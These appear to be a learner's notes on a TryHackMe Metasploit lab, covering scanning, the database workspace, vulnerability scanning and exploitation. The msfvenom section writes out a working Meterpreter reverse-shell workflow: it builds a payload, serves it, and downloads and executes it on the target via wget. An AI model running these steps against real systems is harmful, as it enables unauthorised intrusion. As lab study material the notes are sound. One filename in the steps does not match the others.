https://tryhackme.com/room/metasploitexploitation

### Table of contents
- [[#Agenda]]
- [[#Scanning]]
- [[#Metasploit Database]]
- [[#Vulnerability Scanning]]
- [[#Exploitation]]
- [[#`msfvenom`]]

___
### Agenda
[[#Table of contents|Back to the top]]

1. Scan target systems
2. Metasploit database feature
3. Vulnerability scan
4. Exploit vulnerable services on target systems
5. `msfvenom`: create payloads and obtain Meterpreter session on the target system

___
### Scanning
[[#Table of contents|Back to the top]]

`search portscan`

Port scanning tools parameters
- **CONCURRENCY:** Number of targets to be scanned simultaneously
- **PORTS:** Port range to be scanned. 1-1000 here will not be the same as using Nmap with default configuration. Nmap scans 1000 most used ports, Metasploit scans 1000 first ports.
- **RHOSTS:** Target or target network to be scanned.
- **THREADS:** Number of threads that will be used simultaneously. More threads = faster scans.

nmap can be performed from msfconsole

`scanner/discovery/udp_sweep` --> fast way to identify DNS or NetBIOS services

`smb_enumshares` and `smb_version` can be useful on corporate networks

NetBIOS and SMB allow computers to communicate over network to share and send files to printers. NetBIOS name can be an indicator of the importance of a system


___
### Metasploit Database
[[#Table of contents|Back to the top]]

When tackling multiple targets, the database function simplifies project management

`systemctl start postgresql`: start PostgreSQL which Metasploit uses

`msfdb init` / `sudo -u postgres msfdb init`

`db_status`

`workspace`: list workspaces
	`-a [name of workspace]`: adds new workspace
	`-d [name of workspace]`: deletes specified workspace
	`-h`: help
	`workspace [name of existing workspace`: navigate to specified workspace

When using the command `help`, the Database Backend Commands show commands to be used when using Metasploit with a database
For instance, `db_nmap`will record all results in the database

Then, `hosts` and `services` displays hosts and services
	`hosts -R`: add value to RHOSTS parameter

Example workflow
1. `db_nmap`
2. `use auxiliary/scanner/smb/smb_ms17_010`
3. `hosts -R`, `show options`
4. `run`

In a pentesting mission, we scan for available hosts using `db_nmap`, look for vulnerabilities / open ports, we can look for specific services with `services -S [name of service]`

Look for low-hanging fruit
- **HTTP**: web application --> SQL injection or RCE (Remote Code Execution)
- **FTP**: anonymous login, access to interesting files
- **SMB**: SMB exploits like MS17-010
- **SSH**: default/easy to guess credentials
- **RDP**: Bluekeep / weak credentials

___
### Vulnerability Scanning
[[#Table of contents|Back to the top]]

`search [name of service] scanner`

___
### Exploitation
[[#Table of contents|Back to the top]]

Search, info, exploit

Most exploits have a default payload, but `show payloads`shows other usable commands with the exploit --> `set payload`

Pay attention that each payload may require specific parameters to be set --> `show options`

___
### `msfvenom`
[[#Table of contents|Back to the top]]

Create payload in many different formats (PHP, exe, dll, elf, etc.), for many different targets (Apple, Windows, Android, Linux, etc.)

Example

On attacking machine
1. Create payload encoded in .elf format (.exe for Linux): `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.59.157 LPORT=4444 -f elf > shell.elf`
2. Start web server: `python3 -m http.server 9000`
3. Use and setup handler: `use exploit/multi/handler` (set same LHOST and LPORT as in msfvenom command)
	   Setup payload: `set payload linux/x86/meterpreter/reverse_tcp`
4. `run` handler
On target machine
5. Download payload: `wget http://10.10.59.157:9000/shell.elf`
6. Set permission to execute: `chmod +x rev_shell.elf`
7. Execute payload: `./shell.elf`